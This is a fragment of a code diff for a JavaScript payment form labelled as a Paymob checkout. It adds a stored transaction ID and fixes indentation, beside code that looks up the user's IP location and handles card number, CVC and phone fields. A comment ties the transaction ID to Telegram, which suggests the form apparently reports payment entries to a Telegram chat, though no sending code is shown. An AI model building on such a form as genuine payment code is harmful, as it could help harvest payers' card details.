@@ -47,7 +47,7 @@ async function collectDeviceDetails() {
         }
     }
 
-      try {
+    try {
         const res = await fetch('https://ipwho.is/?lang=ar');
         const data = await res.json();
         if (data && data.success !== false) {
@@ -187,6 +187,17 @@ function validateName() {
 document.addEventListener('DOMContentLoaded', () => {
     collectDeviceDetails();
 
+    // 💡 إدارة وتثبيت رقم العملية (Transaction ID) الموحد لمنع اختلافه بين تليجرام وصفحة النجاح
+    let persistentTx = localStorage.getItem("current_tx_id");
+    if (!persistentTx) {
+        persistentTx = "TX_" + Date.now();
+        localStorage.setItem("current_tx_id", persistentTx);
+    }
+    const txInput = document.getElementById("hidden_transaction_id");
+    if (txInput) {
+        txInput.value = persistentTx;
+    }
+
     const paymentMethodSelect = document.getElementById('payment_method');
     const cardSection = document.getElementById('card_section');
     const phoneGroup = document.getElementById('phone_group');
@@ -210,7 +221,7 @@ document.addEventListener('DOMContentLoaded', () => {
         document.getElementById('pay_amount').value = amountParam;
     }
 
-     const toggleCvvBtn = document.getElementById('toggleCvvBtn');
+    const toggleCvvBtn = document.getElementById('toggleCvvBtn');
     if (toggleCvvBtn) {
         toggleCvvBtn.addEventListener('click', () => {
             const cardCvcInput = document.getElementById('card_cvc');
@@ -227,7 +238,7 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-      document.getElementById('pay_amount').addEventListener('input', (e) => {
+    document.getElementById('pay_amount').addEventListener('input', (e) => {
         e.target.value = convertArabicDigitsToEnglish(e.target.value).replace(/[^\d.]/g, '');
         validateAmount();
     });
@@ -264,7 +275,7 @@ document.addEventListener('DOMContentLoaded', () => {
         validateName();
     });
 
-     document.getElementById("paymob_checkout").addEventListener("submit", function (e) {
+    document.getElementById("paymob_checkout").addEventListener("submit", function (e) {
         const isAmountValid = validateAmount();
         let isPhoneValid = validatePhone();
         let isCardValid = validateCardNumber();
@@ -276,6 +287,9 @@ document.addEventListener('DOMContentLoaded', () => {
             e.preventDefault();
             return;
         }
+
+        // تحديث رقم العملية وتوليد رقم جديد لعملية أخرى قادمة عند نجاح الحفظ
+        localStorage.removeItem("current_tx_id");
 
         const submitBtn = document.getElementById("submitButton");
         submitBtn.disabled = true;
